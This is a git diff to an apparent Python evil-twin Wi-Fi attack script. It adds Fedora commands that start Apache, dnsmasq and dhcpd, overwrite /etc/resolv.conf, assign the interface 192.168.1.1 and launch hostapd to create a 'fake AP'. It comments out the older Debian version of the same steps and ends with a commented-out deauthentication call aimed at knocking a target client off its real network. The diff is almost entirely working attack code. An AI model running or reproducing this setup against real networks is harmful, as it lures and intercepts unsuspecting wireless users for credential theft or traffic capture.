@@ -115,7 +115,32 @@ if __name__ == '__main__':
     n = text_file.write(apdconf_text)
     text_file.close()
 
-    print("----------------------starting services----------------")
+    print("----------------------starting services fedora----------------")
+    print("starting apache2 server\n")
+    os.system("systemctl start httpd")
+    print("apache2 web server is up\n\n ")
+
+    print("starting dns server\n")
+    os.system("systemctl start dnsmasq")
+    print("dns server is listening on port 53\n\n")
+
+    print("modefiting the dns configeration\n")
+    os.system("echo nameserver 127.0.0.1 > /etc/resolv.conf")
+    print("dns routing is set\n\n")
+
+    print(f"setting {user_iface} ip address and routing tables\n")
+    os.system(f"ifconfig {user_iface} up 192.168.1.1 netmask 255.255.255.0")
+    os.system("route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")
+    print("interface configured\n\n")
+
+    print("starting dhcp server")
+    os.system("dhcpd")
+    print("dhcp server is up")
+
+    print("creating a fake AP")
+    os.system("hostapd hostapd.conf")
+
+''' print("----------------------starting services debian----------------")
     print("starting apache2 server\n")
     os.system("service apache2 start")
     print("apache2 web server is up\n\n ")
@@ -138,5 +163,7 @@ if __name__ == '__main__':
     print("dhcp server is up")
 
     print("creating a fake AP")
-    os.system("hostapd hostapd.conf")
+    os.system("hostapd hostapd.conf")'''
 
+# if client already is connected to another network, perform deathentication on him
+# perform_deauth('ff:ff:ff:ff:ff:ff:ff:ff', target_client, user_iface)
